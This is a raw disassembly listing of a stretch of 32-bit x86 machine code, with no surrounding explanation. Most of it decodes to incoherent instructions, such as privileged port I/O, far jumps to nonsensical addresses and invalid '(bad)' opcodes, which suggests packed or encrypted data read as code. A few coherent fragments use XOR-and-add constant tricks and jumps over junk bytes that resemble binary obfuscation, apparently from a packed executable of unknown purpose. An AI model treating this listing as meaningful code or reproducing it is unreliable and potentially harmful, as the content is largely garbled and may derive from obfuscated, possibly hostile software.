  41080b:	mov    al,ds:0x2d0f06f4
  410810:	test   DWORD PTR [ecx+0x62],eax
  410813:	fidivr DWORD PTR [esi]
  410815:	and    edi,eax
  410817:	pop    esp
  410818:	jecxz  0x410825
  41081a:	ins    BYTE PTR es:[edi],dx
  41081b:	ins    DWORD PTR es:[edi],dx
  41081c:	and    BYTE PTR [eax+0x2c83617f],0x3a
  410823:	cmp    DWORD PTR [esi+0x30],edx
  410826:	cli    
  410827:	mov    eax,0x8a34d770
  41082c:	push   0x42
  41082e:	daa    
  41082f:	test   eax,0xc9139e7c
  410834:	pusha  
  410835:	nop
  410836:	popa   
  410837:	add    ebx,DWORD PTR [esi]
  410839:	mov    ecx,0x96522ac8
  41083e:	ins    BYTE PTR es:[edi],dx
  41083f:	jecxz  0x410821
  410841:	lods   eax,DWORD PTR ds:[esi]
  410842:	add    al,0xe9
  410844:	jecxz  0x4107c8
  410846:	jge    0x410844
  410848:	retf   
  410849:	stc    
  41084a:	jo     0x4107f9
  41084c:	adc    esi,edi
  41084e:	dec    esp
  41084f:	sbb    DWORD PTR [eax],esi
  410851:	test   eax,0x17441587
  410856:	inc    eax
  410857:	xchg   ebp,eax
  410858:	or     ebp,DWORD PTR [eax+0x78]
  41085b:	push   cs
  41085c:	and    DWORD PTR [ecx-0x4ee6e452],esi
  410862:	add    DWORD PTR [esi+0x2168c4b8],eax
  410868:	xor    DWORD PTR [ebp-0xa47bdc4],edi
  41086e:	das    
  41086f:	cs (bad) 
  410871:	dec    ebp
  410872:	cli    
  410873:	adc    DWORD PTR [ecx-0x1941530d],ebx
  410879:	mov    ebx,0xf5b51776
  41087e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41087f:	or     bh,ch
  410881:	dec    edx
  410882:	rcr    DWORD PTR [esi],1
  410884:	addr16 pop ss
  410886:	pop    esp
  410887:	int    0x6f
  410889:	call   0x8bb9:0xfa2edddc
  410890:	int    0x3a
  410892:	retf   
  410893:	int3   
  410894:	and    al,0x84
  410896:	outs   dx,BYTE PTR ds:[esi]
  410897:	sbb    ah,ch
  410899:	arpl   si,bp
  41089b:	sbb    esi,DWORD PTR [ecx-0x4ae28173]
  4108a1:	nop
  4108a2:	fcom   st(2)
  4108a4:	inc    sp
  4108a6:	fnstcw WORD PTR [ebx+0x48]
  4108a9:	or     DWORD PTR [ecx+edi*4+0x69],edx
  4108ad:	(bad)  
  4108ae:	sbb    eax,0x4274a1af
  4108b3:	mov    DWORD PTR [ecx],edi
  4108b5:	push   es
  4108b6:	cmp    bl,dh
  4108b8:	scas   eax,DWORD PTR es:[edi]
  4108b9:	xchg   ebx,eax
  4108ba:	or     eax,0xc5acb32e
  4108bf:	cmp    al,0xd6
  4108c1:	sub    DWORD PTR [esi+edi*8],esi
  4108c4:	cmp    eax,0xe3c8f70f
  4108c9:	adc    BYTE PTR [ecx],ch
  4108cb:	rcr    DWORD PTR [edi],1
  4108cd:	les    ebx,FWORD PTR [ebx-0x5f9cba19]
  4108d3:	and    BYTE PTR [eax*8-0x548f275b],cl
  4108da:	add    esi,DWORD PTR [edx-0x2]
  4108dd:	push   esp
  4108de:	xchg   edx,eax
  4108df:	rol    BYTE PTR [eax-0x22ce77c6],0x57
  4108e6:	push   edx
  4108e7:	xchg   esi,eax
  4108e8:	add    ch,BYTE PTR ds:0x264e880d
  4108ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4108ef:	pop    ss
  4108f0:	repz les eax,FWORD PTR [edi-0x2aaf99ec]
  4108f7:	xlat   BYTE PTR ds:[ebx]
  4108f8:	push   0x978f54b6
  4108fd:	ins    BYTE PTR es:[edi],dx
  4108fe:	cld    
  4108ff:	int    0x43
  410901:	mov    al,0x24
  410903:	test   al,0xe1
  410905:	sahf   
  410906:	add    eax,0x2a5740f7
  41090b:	repz jno 0x410905
  41090e:	mov    esi,0xc4efcd88
  410913:	push   eax
  410914:	xor    ch,dl
  410916:	xchg   edi,eax
  410917:	ds mov ch,0xa4
  41091a:	push   esp
  41091b:	call   0x8d7f:0xfac4a35c
  410922:	mov    dl,BYTE PTR [ebp+0x2f80cf88]
  410928:	idiv   cl
  41092a:	imul   ebp,DWORD PTR [esi+0x52],0x12
  41092e:	mov    al,BYTE PTR [edi-0x41]
  410931:	jl     0x4109ab
  410933:	cld    
  410934:	and    eax,0xee4fc31
  410939:	cdq    
  41093a:	mov    BYTE PTR [esi+0x63],cl
  41093d:	mov    dl,bh
  41093f:	sub    BYTE PTR [ecx+0x3690a855],0x96
  410946:	mov    cs,WORD PTR [ebx-0x31]
  410949:	fwait
  41094a:	das    
  41094b:	xor    esp,DWORD PTR [ebx+0x27b6cdae]
  410951:	lds    edx,FWORD PTR [ebx+0x49ef00ee]
  410957:	leave  
  410958:	out    0xf8,al
  41095a:	mov    ds:0x350f4514,eax
  41095f:	jmp    0x4109d0
  410961:	imul   edx,DWORD PTR [eax+eiz*1],0xffffffbc
  410965:	xchg   edx,eax
  410966:	out    0x90,al
  410968:	ds push cs
  41096a:	enter  0x426a,0x6d
  41096e:	cmp    BYTE PTR [edx],dl
  410970:	mov    ecx,0xa5a13bd8
  410975:	xchg   DWORD PTR [ebp-0x37],ecx
  410978:	es mov ?,edi
  41097b:	test   BYTE PTR [ecx+0x31],bh
  41097e:	test   eax,0x8fb26501
  410983:	jns    0x4109be
  410985:	retf   0xd850
  410988:	ror    edi,cl
  41098a:	retf   
  41098b:	shl    DWORD PTR [edi+edx*4],cl
  41098e:	dec    esi
  41098f:	xchg   esi,ecx
  410991:	pop    eax
  410992:	sahf   
  410993:	aas    
  410994:	ds lahf 
  410996:	sub    al,0xfc
  410998:	add    ecx,DWORD PTR [edx+0x67]
  41099b:	push   ds
  41099c:	sub    bh,BYTE PTR [ebx-0x409603ae]
  4109a2:	add    al,0x84
  4109a4:	jmp    0xca5446eb
  4109a9:	out    dx,al
  4109aa:	out    dx,eax
  4109ab:	mov    eax,0xfd6460d4
  4109b0:	and    DWORD PTR [eax-0x27cbf51b],ecx
  4109b6:	xor    cl,dl
  4109b8:	dec    ebp
  4109b9:	(bad)
  4109bc:	xor    BYTE PTR [ecx+0x6d],0xb6
  4109c0:	pop    ebp
  4109c1:	leave  
  4109c2:	jmp    0x410952
  4109c4:	cmp    dh,dl
  4109c6:	sar    dh,1
  4109c8:	mov    bl,0x52
  4109ca:	retf   
  4109cb:	sub    eax,0xf053f56e
  4109d0:	xchg   esp,eax
  4109d1:	int3   
  4109d2:	inc    esi
  4109d3:	arpl   si,si
  4109d5:	adc    al,0xcf
  4109d7:	push   edx
  4109d8:	push   eax
  4109d9:	out    0xb3,al
  4109db:	sub    edi,DWORD PTR [ecx]
  4109dd:	(bad)  [eax]
  4109df:	xchg   ebp,eax
  4109e0:	repnz adc ecx,DWORD PTR [ebp-0x4a]
  4109e4:	mov    ebx,0x960f0ebd
  4109e9:	xchg   ebx,eax
  4109ea:	pop    esp
  4109eb:	inc    edx
  4109ec:	pop    ebx
  4109ed:	icebp  
  4109ee:	ds ja  0x410a2b
  4109f1:	add    BYTE PTR [ebx],al
  4109f3:	nop
  4109f4:	xchg   al,ch
  4109f6:	clc    
  4109f7:	push   si
  4109f9:	sub    eax,0x573ec8d0
  4109fe:	loop   0x4109e4
  410a00:	cmp    eax,0xa359e504
  410a05:	jge    0x4109a7
  410a07:	and    DWORD PTR [esi-0x63f26222],ebp
  410a0d:	cmp    DWORD PTR [edi-0x19],0xffffffd0
  410a11:	jne    0x4109fb
  410a13:	mov    ecx,0x9dfea779
  410a18:	mov    ah,0x38
  410a1a:	loop   0x410a05
  410a1c:	es mov ebx,0xc02eead
  410a22:	enter  0x3dbb,0xc2
  410a26:	jnp    0x410a26
  410a28:	addr16 jg 0x410a45
  410a2b:	scas   al,BYTE PTR es:[edi]
  410a2c:	pushf  
  410a2d:	in     eax,0x10
  410a2f:	cli    
  410a30:	xchg   esp,eax
  410a31:	jnp    0x410aa1
  410a33:	sbb    ah,BYTE PTR [ecx]
  410a35:	rol    BYTE PTR [ebx+0x6d300e5],0xea
  410a3c:	pop    es
  410a3d:	inc    eax
  410a3e:	fs mov esp,0xed6626df
  410a44:	jbe    0x410a54
  410a46:	arpl   WORD PTR ds:0xe414c319,sp
  410a4c:	retf   
  410a4d:	stos   DWORD PTR es:[edi],eax
  410a4e:	cli    
  410a4f:	loop   0x410a53
  410a51:	push   0x531a94bc
  410a56:	test   BYTE PTR [edx-0x51],bl
  410a59:	jno    0x410aa7
  410a5b:	jle    0x410a44
  410a5d:	mov    cs,WORD PTR [ebp-0x80]
  410a60:	sbb    DWORD PTR [esi+0x5b],0x3161ef28
  410a67:	js     0x410a07
  410a69:	scas   al,BYTE PTR es:[edi]
  410a6a:	les    edi,FWORD PTR [ecx]
  410a6c:	iret   
  410a6d:	xor    BYTE PTR [ebx-0x41],0xfe
  410a71:	jmp    0x64ac:0x804b6c9e
  410a78:	add    DWORD PTR [esi-0x4a167ce5],eax
  410a7e:	adc    dh,BYTE PTR [ebx-0x5f]
  410a81:	out    dx,eax
  410a82:	or     BYTE PTR [edi-0x5f375d21],0x58
  410a89:	jmp    0x410ab1
  410a8b:	dec    ebx
  410a8c:	or     eax,0xafa610b5
  410a91:	or     dl,0xb
  410a94:	pop    esp
  410a95:	adc    cl,dh
  410a97:	sbb    DWORD PTR [ebp-0x2b27a9e9],ebx
  410a9d:	cmp    DWORD PTR [ebx+0x3c60cf33],eax
  410aa3:	xchg   ebp,eax
  410aa4:	mov    edi,0xf96714ec
  410aa9:	sub    BYTE PTR [edi-0x49321041],dh
  410aaf:	stos   BYTE PTR es:[edi],al
  410ab0:	add    bl,ch
  410ab2:	pop    ds
  410ab3:	push   ebx
  410ab4:	int    0x2e
  410ab6:	pop    ds
  410ab7:	ret    0xc3ba
  410aba:	push   ecx
  410abb:	pop    ss
  410abc:	inc    ecx
  410abd:	jns    0x410ac2
  410abf:	pop    eax
  410ac0:	repz fwait
  410ac2:	jnp    0x410af7
  410ac4:	pop    ss
  410ac5:	ret    0x210a
  410ac8:	sbb    DWORD PTR [ebp+0x8f68d9d],esi
  410ace:	in     eax,dx
  410acf:	add    DWORD PTR [ebx+0x7],0x5e
  410ad3:	frstor [esi]
  410ad5:	jae    0x410b40
  410ad7:	iret   
  410ad8:	loop   0x410b2c
  410ada:	imul   eax,DWORD PTR [esi-0x2e],0xaf33919c
  410ae1:	popfw  
  410ae3:	inc    eax
  410ae4:	out    dx,eax
  410ae5:	inc    eax
  410ae6:	sbb    eax,0x733756b8
  410aeb:	xlat   BYTE PTR ds:[ebx]
  410aec:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410aee:	mov    edi,0x1e3c677f
  410af3:	outs   dx,DWORD PTR ds:[esi]
  410af4:	jecxz  0x410afd
  410af6:	jle    0x410b0a
  410af8:	not    DWORD PTR [eax]
  410afa:	dec    esi
  410afb:	push   esp
  410afc:	cdq    
  410afd:	ja     0x410b79
  410aff:	scas   eax,DWORD PTR es:[edi]
  410b00:	pop    es
  410b01:	and    al,0xb7
  410b03:	int    0xa2
  410b05:	ins    DWORD PTR es:[edi],dx
  410b06:	pop    es
  410b07:	popa   
  410b08:	fiadd  WORD PTR [eiz*4-0x620af353]
  410b0f:	mov    edx,0xcba9eaf4
  410b14:	repnz mov dh,0xa0
  410b17:	(bad)  
  410b18:	aad    0xe0
  410b1a:	jns    0x410b90
  410b1c:	xor    BYTE PTR [ecx-0x69],bl
  410b1f:	les    eax,FWORD PTR [ebp-0x1d896db6]
  410b25:	mov    eax,0xfa0bf820
  410b2a:	jb     0x410b77
  410b2c:	mov    BYTE PTR [ebx-0x1e],ch
  410b2f:	in     eax,dx
  410b30:	jo     0x410b2c
  410b32:	pushf  
  410b33:	pop    esi
  410b34:	xchg   DWORD PTR [ebx],esp
  410b36:	xor    al,BYTE PTR [edx]
  410b38:	lahf   
  410b39:	pusha  
  410b3a:	out    0xd0,al
  410b3c:	retf   0x2a3e
  410b3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b40:	xchg   BYTE PTR [edx],bh
  410b42:	push   esp
  410b43:	lahf   
  410b44:	mov    ecx,0xac658a7c
  410b49:	jbe    0x410b90
  410b4b:	sbb    eax,0x2a1052be
  410b50:	push   ss
  410b51:	lea    eax,[ebx]
  410b53:	pop    eax
  410b54:	out    0x89,al
  410b56:	xchg   ebp,eax
  410b57:	sub    cl,ch
  410b59:	in     al,dx
  410b5a:	outs   dx,DWORD PTR ds:[esi]
  410b5b:	or     al,0x11
  410b5d:	inc    eax
  410b5e:	mov    ds:0x46392d59,al
  410b63:	push   esp
  410b64:	pop    esi
  410b65:	je     0x410b73
  410b6b:	mov    eax,DWORD PTR [ebp+0x8]
  410b6e:	jmp    0x410b8c
  410b73:	mov    eax,DWORD PTR [ebp-0x4]
  410b76:	xor    eax,edx
  410b78:	add    eax,ecx
  410b7a:	jmp    0x410b8c
  410b7f:	mov    eax,DWORD PTR [ebp-0x4]
  410b82:	xor    eax,0x7510855
  410b87:	add    eax,0x32729c
  410b8c:	leave  
  410b8d:	ret    0x4
  410b90:	push   ebp
  410b91:	mov    ebp,esp
  410b93:	jmp    0x410f98
  410b98:	outs   dx,DWORD PTR ds:[esi]
  410b99:	mov    WORD PTR ds:0x7191e994,cs
  410b9f:	jae    0x410bc2
  410ba1:	dec    esi
  410ba2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ba3:	repz cdq 
  410ba5:	adc    cl,BYTE PTR [ebp+0x35]
  410ba8:	ds inc edx
  410baa:	jo     0x410c1c
  410bac:	pop    eax
  410bad:	jge    0x410c1f
  410baf:	jo     0x410b9f
  410bb1:	pusha  
  410bb2:	sahf   
  410bb3:	mov    esi,0x7f1bccce
  410bb8:	dec    eax
  410bb9:	nop
  410bba:	sub    DWORD PTR [edi-0x785bbf6a],esp
  410bc0:	adc    dh,bh
  410bc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410bc3:	mov    eax,0x3c1043c8
  410bc8:	popf   
  410bc9:	bound  edi,QWORD PTR [edx]
  410bcb:	aas    
  410bcc:	and    eax,0xde4413fb
  410bd1:	sbb    eax,0x1d569b6a
  410bd6:	or     ebp,DWORD PTR [ecx]
  410bd8:	sub    al,0x97
  410bda:	mov    eax,0x97294efa
  410bdf:	mov    ecx,DWORD PTR [edi-0x3b2bb50b]
  410be5:	sbb    edi,DWORD PTR [esi]
  410be7:	pushf  
  410be8:	xchg   DWORD PTR [ebp-0x4785b98e],ebp
  410bee:	push   eax
  410bef:	and    ecx,edi
  410bf1:	pusha  
  410bf2:	push   edi
  410bf3:	adc    bl,cl
  410bf5:	sahf   
  410bf6:	imul   esp,esi,0xabda9fae
  410bfc:	int    0x6c
  410bfe:	adc    bl,BYTE PTR [esi+ebp*2+0x635a8d28]
  410c05:	mov    esi,0x62c4318b
  410c0a:	div    dl
  410c0c:	mov    bl,0x6e
  410c0e:	call   0xf6c0ddaa
  410c13:	jp     0x410c71
  410c15:	mov    cl,0x42
  410c17:	out    dx,eax
  410c18:	adc    eax,0x3e981224
  410c1d:	std    
  410c1e:	add    BYTE PTR [edx+0x490fc5fb],bl
  410c24:	mov    dh,0xa2
  410c26:	popa   
  410c27:	(bad)  
  410c28:	in     al,dx
  410c29:	imul   ebp,DWORD PTR ds:0xf3ab6180,0xe5dc5715
  410c33:	popf   
  410c34:	scas   al,BYTE PTR es:[edi]
  410c35:	pop    ecx
  410c36:	inc    ecx
  410c37:	xor    ecx,DWORD PTR [eax-0x2b90a626]
  410c3d:	sub    al,0x5a
  410c3f:	push   ss
  410c40:	pop    esi
  410c41:	adc    BYTE PTR [esi+0x30aaf303],cl
  410c47:	popf   
  410c48:	jge    0x410c45
  410c4a:	loop   0x410c98
  410c4c:	ret    0xa301
  410c4f:	mov    esi,0xbc0a1854
  410c54:	inc    ebp
  410c55:	retf   
  410c56:	call   0xfb36:0x88d8f766
  410c5d:	or     ebx,DWORD PTR [ebx]
  410c5f:	out    0x9b,eax
  410c61:	in     eax,dx
  410c62:	int    0x2d
  410c64:	dec    eax
  410c65:	add    al,0x6c
  410c67:	push   0xffffffc8
  410c69:	outs   dx,BYTE PTR ds:[esi]
  410c6a:	mov    edi,DWORD PTR [ebp+0x23]
  410c6d:	lods   eax,DWORD PTR ds:[esi]
  410c6e:	or     DWORD PTR [ecx+edi*4+0x5f],esp
  410c72:	repnz ss sbb eax,0x32a0f3f7
  410c79:	div    BYTE PTR [esi+0x3d71a819]
  410c7f:	push   cs
  410c80:	and    esp,DWORD PTR [ebp+eax*1-0x2a]
  410c84:	push   esp
  410c85:	cmp    BYTE PTR [esp+esi*8-0x67e614bf],ah
  410c8c:	das    
  410c8d:	mov    eax,0x6e92c34c
  410c92:	(bad)  
  410c93:	sbb    al,0x46
  410c95:	faddp  st(2),st
  410c97:	push   esp
  410c98:	cs jmp 0x4715:0x9f255ffd
  410ca0:	pop    es
  410ca1:	lds    eax,FWORD PTR [ebx]
  410ca3:	or     edi,DWORD PTR ds:0xce1e0fec
  410ca9:	(bad)  
  410caa:	cmp    DWORD PTR [esi+0x1c],eax
  410cad:	mov    ah,0xf2
  410caf:	(bad)  
  410cb1:	sbb    edx,esi
  410cb3:	cmp    eax,0x893a4aa5
  410cb8:	pop    ss
  410cb9:	jb     0x410c69
  410cbb:	test   eax,0x639eb7cd
  410cc0:	jb     0x410c6a
  410cc2:	in     eax,dx
  410cc3:	sub    al,0x3b
  410cc5:	sahf   
  410cc6:	push   eax
  410cc7:	aam    0xb1
  410cc9:	bound  ebp,QWORD PTR [edi+0x54]
  410ccc:	push   esi
  410ccd:	cwde   
  410cce:	dec    esi
  410ccf:	push   ebp
  410cd0:	int3   
  410cd1:	fucomi st,st(3)
  410cd3:	cld    
  410cd4:	es adc eax,0x81732d0d
  410cda:	enter  0xd87e,0xd0
  410cde:	sti    
  410cdf:	dec    eax
  410ce0:	or     BYTE PTR [ebp+0x18],bh
  410ce3:	fcmovnu st,st(2)
  410ce5:	cmp    dh,cl
  410ce7:	daa    
  410ce8:	mov    bh,dh
  410cea:	das    
  410ceb:	in     al,dx
  410cec:	jg     0x410d36
  410cee:	das    
  410cef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410cf0:	adc    BYTE PTR [eax],ah
  410cf2:	cli    
  410cf3:	adc    DWORD PTR [ecx],0xfb4a0ae9
  410cf9:	in     al,dx
  410cfa:	pop    es
  410cfb:	or     eax,0xba5c9b11
  410d00:	mov    ?,esi
  410d02:	add    esi,edi
  410d04:	jne    0x410cb9
  410d06:	out    0xe9,eax
  410d08:	shl    al,0xa0
  410d0b:	loopne 0x410d39
  410d0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d0e:	jmp    0x410d63
  410d10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d11:	xchg   esi,eax
  410d12:	pop    bp
  410d14:	xor    eax,0x7070be8a
  410d19:	cwde   
  410d1a:	and    ebp,0x53917f93
  410d20:	ja     0x410d8e
  410d22:	pop    ebx
  410d23:	mov    ah,0x52
  410d25:	jne    0x410cf1
  410d27:	inc    esi
  410d28:	push   ebp
  410d29:	imul   ebp,DWORD PTR [edx-0x4f9582a3],0xffffffbd
  410d30:	mov    edx,0xfa00eac7
  410d35:	mov    ch,0x48
  410d37:	jo     0x410dac
  410d39:	ret    
  410d3a:	and    eax,0xdcd53788
  410d3f:	xor    DWORD PTR [ecx+0x173e6d8],0xffffffa3
  410d46:	pop    esi
  410d47:	repnz stos BYTE PTR es:[edi],al
  410d49:	mov    dl,0xae
  410d4b:	cmp    BYTE PTR [eax],cl
  410d4d:	pop    ds
  410d4e:	jbe    0x410db4
  410d50:	jmp    0x410d30
  410d52:	or     edi,DWORD PTR [esi+0x2360908b]
  410d58:	jle    0x410d70
  410d5a:	pusha  
  410d5b:	mov    bh,0xaf
  410d5d:	and    eax,0xedb65821
  410d62:	pusha  
  410d63:	push   cs
  410d64:	cdq    
  410d65:	fsub   QWORD PTR [eax+0x46bb0794]
  410d6b:	js     0x410d40
  410d6d:	lods   eax,DWORD PTR ds:[esi]
  410d6e:	test   eax,0x895fc20
  410d73:	test   eax,0x2bf47e9b
  410d78:	(bad)  
  410d79:	mov    edi,0x9a21955e
  410d7e:	popa   
  410d7f:	mov    edi,edi
  410d81:	fst    DWORD PTR [esi]
  410d83:	test   al,0xff
  410d85:	retf   0x23c6
  410d88:	loopne 0x410d18
  410d8a:	add    esi,DWORD PTR [edx+0x4]
  410d8d:	inc    eax
  410d8e:	les    esi,FWORD PTR [ecx]
  410d90:	icebp  
  410d91:	sbb    esi,DWORD PTR [edi]
  410d93:	push   es
  410d94:	push   cs
  410d95:	push   ds
  410d96:	or     BYTE PTR ds:0x6022b40f,dh
  410d9c:	jecxz  0x410d8c
  410d9e:	popf   
  410d9f:	out    0xda,eax
  410da1:	ret    
  410da2:	or     esi,DWORD PTR [edx-0xe]
  410da5:	cld    
  410da6:	sbb    eax,DWORD PTR [edi+0x28587660]
  410dac:	fbld   TBYTE PTR [ecx+0xa8d0220]
  410db2:	push   0x41
  410db4:	arpl   cx,bp
  410db6:	sbb    cl,0x84
  410db9:	int3   
  410dba:	pushf  
  410dbb:	pop    edi
  410dbc:	mov    ds:0x8b5828f1,al
  410dc1:	mov    ah,dl
  410dc3:	test   al,0x93
  410dc5:	mov    esi,0x89c3c928
  410dca:	fist   DWORD PTR [edi]
  410dcc:	push   ds
  410dcd:	xchg   edx,eax
  410dce:	jne    0x410e41
  410dd0:	std    
  410dd1:	sbb    esp,DWORD PTR [ebp-0xe]
  410dd4:	iret   
  410dd5:	aaa    
  410dd6:	mov    ebp,0xf52aaf55
  410ddb:	sbb    eax,0x6a95a96c
  410de0:	adc    BYTE PTR [edx+0x26301098],dh
  410de6:	mov    ebp,0xe38a4935
  410deb:	push   0x6c
  410ded:	cld    
  410dee:	push   es
  410def:	in     al,0x42
  410df1:	mov    esp,0xfe1a7df3
  410df6:	nop
  410df7:	enter  0xa11a,0xd0
  410dfb:	sub    cl,BYTE PTR [ebx+0x764f9312]
  410e01:	mov    edx,0x25192767
  410e06:	mov    esi,0x537562a2
  410e0b:	retf   
  410e0c:	sbb    eax,0xc4012f76
  410e11:	shl    ebp,0x37
  410e14:	and    eax,0xc5b98162
  410e19:	mov    esp,0x98988fc7
  410e1e:	dec    ebx
  410e1f:	paddd  mm7,QWORD PTR [edx+0x3]
  410e23:	sbb    BYTE PTR [ecx+esi*8-0x44],0x27
  410e28:	inc    ecx
  410e29:	push   eax
  410e2a:	scas   al,BYTE PTR es:[edi]
  410e2b:	icebp  
  410e2c:	jbe    0x410ea1
  410e2e:	daa    
  410e2f:	inc    eax
  410e30:	pop    ss
  410e31:	ror    DWORD PTR [esp+eax*1-0x17],1
  410e35:	push   ebx
  410e36:	fild   QWORD PTR [ebx+0x48]
  410e39:	loopne 0x410e0d
  410e3b:	jo     0x410e3d
  410e3d:	sbb    DWORD PTR ds:0x518c77a5,esi
  410e43:	test   BYTE PTR [ecx+0x3c],dl
  410e46:	cmp    bp,WORD PTR [eax-0x3]
  410e4a:	pop    edx
  410e4b:	cmp    BYTE PTR [edi],al
  410e4d:	mov    esi,0x284a968c
  410e52:	inc    eax
  410e53:	push   ebp
  410e54:	mov    al,ds:0x841353ca
  410e59:	dec    esi
  410e5a:	jl     0x410e39
  410e5c:	xchg   edi,eax
  410e5d:	push   ecx
  410e5e:	dec    ax
  410e60:	add    al,0xb0
  410e62:	rcl    ch,1
  410e64:	mov    fs,WORD PTR cs:[edi+0x79]
  410e68:	ins    DWORD PTR es:[edi],dx
  410e69:	and    DWORD PTR [eax+edi*8],edi
  410e6c:	xchg   ebp,eax
  410e6d:	cmc    
  410e6e:	fs xchg ebx,eax
  410e70:	ds inc esi
  410e72:	neg    DWORD PTR [ebp+0x1]
  410e75:	out    0x26,eax
  410e77:	or     BYTE PTR [esp+edx*1],al
  410e7a:	leave  
  410e7b:	inc    ebx
  410e7c:	aam    0xb3
  410e7e:	mov    edi,DWORD PTR [ecx]
  410e80:	add    DWORD PTR [edx+0x3f],esi
  410e83:	jne    0x410e6a
  410e85:	scas   eax,DWORD PTR es:[edi]
  410e86:	mov    ds,WORD PTR [si+0x7fe8]
  410e8b:	or     ah,cl
  410e8d:	adc    DWORD PTR [edx-0x6],esi
  410e90:	popf   
  410e91:	inc    esp
  410e92:	test   DWORD PTR [ebx],edi
  410e94:	in     eax,dx
  410e95:	jmp    0xde84da96
  410e9a:	push   0x69f62397
  410e9f:	mov    ebp,0x912d404a
  410ea4:	(bad)  
  410ea5:	mov    bh,0x6d
  410ea7:	pop    ecx
  410ea8:	add    DWORD PTR [ecx+0x36dc938b],ebp
  410eae:	xor    ebp,ecx
  410eb0:	pop    ecx
  410eb1:	out    dx,eax
  410eb2:	add    BYTE PTR [edx+0x6a],ah
  410eb5:	nop
  410eb6:	(bad)  
  410eb7:	push   DWORD PTR [ecx-0x5e]
  410eba:	pop    edx
  410ebb:	xor    ecx,DWORD PTR [ebp-0x473e4fbb]
  410ec1:	xchg   BYTE PTR [esi-0x45194252],al
  410ec7:	dec    ebp
  410ec8:	(bad)  
  410ec9:	dec    eax
  410eca:	outs   dx,DWORD PTR ds:[esi]
  410ecb:	inc    edx
  410ecc:	neg    BYTE PTR [eax+0x26]
  410ecf:	call   0xee2c:0xcb66180c
  410ed6:	xor    edi,DWORD PTR [ebx+0x68c9e1ef]
  410edc:	sub    eax,DWORD PTR [ebx-0x1f892f81]
  410ee2:	inc    eax
  410ee3:	pop    esp
  410ee4:	(bad)  
  410ee5:	hlt    
  410ee6:	iret   
  410ee7:	call   0xedc1:0xbe5d15ed
  410eee:	xor    dh,BYTE PTR ds:0x106ee4ff
  410ef4:	out    0x5d,al
  410ef6:	call   0xf0d29707
  410efb:	ret    0x44ed
  410efe:	hlt    
  410eff:	mov    edx,0xc03f9f05
  410f04:	cmp    edx,DWORD PTR [esi+0x1b]
  410f07:	mov    ecx,0x448b6a93
  410f0c:	sub    BYTE PTR [edi],bl
  410f0e:	ror    DWORD PTR ds:0xf0ad8561,0x76
  410f15:	sub    DWORD PTR [esp+edi*2],edx
  410f18:	mov    eax,0x9500de38
  410f1d:	inc    ebx
  410f1e:	(bad)  
  410f1f:	mov    cl,0xb5
  410f21:	inc    edi
  410f22:	lahf   
  410f23:	ficomp DWORD PTR [ebx-0x51]
  410f26:	imul   eax,DWORD PTR [ecx],0x56
  410f29:	add    BYTE PTR [ecx+eax*8],cl
  410f2c:	ja     0x410f56
  410f2e:	and    eax,0xf699fbf5
  410f33:	pop    esi
  410f34:	cli    
  410f35:	mov    ds:0x927440f8,eax
  410f3a:	jge    0x410f76
  410f3c:	fld    QWORD PTR [ebx+0x4fafa8e0]
  410f42:	sbb    BYTE PTR [ecx],dh
  410f44:	in     al,0x79
  410f46:	and    al,0xe1
  410f48:	mov    eax,ds:0x3834eb50
  410f4d:	cmp    al,0x4b
  410f4f:	xchg   ch,bl
  410f51:	or     BYTE PTR [ecx-0x12],ch
  410f54:	popa   
  410f55:	retf   
  410f56:	lds    ebx,FWORD PTR [edx+0x8]
  410f59:	jae    0x410f8a
  410f5b:	push   ebx
  410f5c:	jp     0x410f60
  410f5e:	cmp    eax,0xd5eee9ca
  410f63:	cmc    
  410f64:	shr    BYTE PTR [ebp+0x5ca7051],cl
  410f6a:	adc    bh,BYTE PTR ds:0xadfe3031
  410f70:	push   esi
  410f71:	xchg   esi,eax
  410f72:	outs   dx,DWORD PTR ds:[esi]
  410f73:	jmp    0x522be943
  410f78:	bound  ebp,QWORD PTR [eax]
  410f7a:	(bad)  
  410f7b:	pop    esp
  410f7c:	fucom  st(1)
  410f7e:	lds    edx,FWORD PTR [edx+0x2cacc044]
  410f84:	fld    QWORD PTR [ebp+0x4e]
  410f87:	sub    bh,BYTE PTR [ecx]
  410f89:	pop    edx
  410f8a:	xchg   esi,eax
  410f8b:	sbb    al,0x8b
  410f8d:	pop    ebx
  410f8e:	sbb    eax,DWORD PTR [ecx]
  410f90:	mov    ch,0x99
  410f92:	mov    ecx,0x384a7efa
  410f97:	ins    DWORD PTR es:[edi],dx
  410f98:	mov    eax,ds:0x41b22c
  410f9d:	mov    edx,0x32729c
  410fa2:	sub    eax,edx
  410fa4:	adc    DWORD PTR ds:0x42fe6e,ebx
  410faa:	mov    ecx,0x7510855
  410faf:	push   esi
  410fb0:	mov    esi,DWORD PTR [ebp+0xc]
  410fb3:	xor    eax,ecx
  410fb5:	mov    DWORD PTR ds:0x42e21c,0x4b31
  410fbf:	jmp    0x4113c4
  410fc4:	xchg   edx,eax
  410fc5:	shl    DWORD PTR [edi+eiz*8+0x71516771],cl
  410fcc:	push   ebp
  410fcd:	paddsw mm6,QWORD PTR [eax-0x3fbff396]
  410fd4:	es dec esi
  410fd6:	jo     0x411048
  410fd8:	pop    eax
  410fd9:	jge    0x41104b
  410fdb:	jo     0x410fc5
  410fdd:	jae    0x410ff7
  410fdf:	xor    eax,DWORD PTR [edi+0x541eb90c]
  410fe5:	push   es
  410fe6:	aaa    
  410fe7:	push   ds
  410fe8:	addr16 fwait
  410fea:	jae    0x410fb3
  410fec:	xchg   dh,cl
  410fee:	mov    eax,0x77f7ebdd
  410ff3:	pop    es
  410ff4:	push   0x9fbff7b7
  410ff9:	repnz or eax,0x99c013d9
  410fff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411000:	lods   al,BYTE PTR ds:[esi]
  411001:	pop    ecx
  411002:	mov    ebp,0x10ae22e3
  411007:	mov    edx,0x2cadb630
  41100c:	stos   DWORD PTR es:[edi],eax
  41100d:	cmp    DWORD PTR [edi-0x187cfda9],esp
